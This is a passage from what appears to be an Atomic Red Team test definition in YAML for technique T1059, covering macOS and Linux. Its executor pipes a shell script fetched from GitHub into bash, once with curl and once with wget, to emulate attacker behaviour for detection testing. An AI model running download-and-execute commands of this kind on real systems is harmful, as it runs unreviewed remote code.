    - macos
    - linux

  executor:
    name: sh
    command: |
      bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
      bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
